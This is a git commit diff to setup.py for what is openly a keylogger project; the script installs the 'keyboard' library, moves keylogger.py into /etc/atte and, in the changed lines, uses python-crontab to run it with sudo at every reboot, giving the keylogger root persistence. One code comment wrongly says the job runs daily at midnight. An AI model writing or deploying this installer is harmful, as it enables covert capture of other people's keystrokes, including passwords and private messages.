783117aa0edc8730fdbcd6f8feaf740f4faadcd8
cazueirobr <matheus.sydor@hotmail.com>
2023-03-23 14:28:12 -0300

    feat: Setup funcionando com o modulo crontab do python

--- setup.py
+++ setup.py
@@ -4,15 +4,20 @@ import os
 def dependencias():
     os.system('sudo apt-get install pip -y')
     os.system('sudo pip3 install keyboard')
+    os.system('sudo pip3 install python-crontab')
 
 
 def instalar():
+    from crontab import CronTab
     diretorio_atual = os.getcwd()
     os.mkdir('/etc/atte')
     os.system(f'sudo mv {diretorio_atual}/keylogger.py /etc/atte')
-    cron = open('/etc/crontab', 'a')
-    cron.write('@reboot root sudo /usr/bin/python3 /etc/atte/keylogger.py')
-    cron.close()
+    cron = CronTab(user=True)
+
+# adicionar uma nova tarefa ao crontab
+    job = cron.new(command='sudo /usr/bin/python3 /etc/atte/keylogger.py')
+    job.setall('@reboot')  # executar todos os dias à meia-noite
+    cron.write()  # salvar as mudanças no arquivo crontab
 
 
 dependencias()
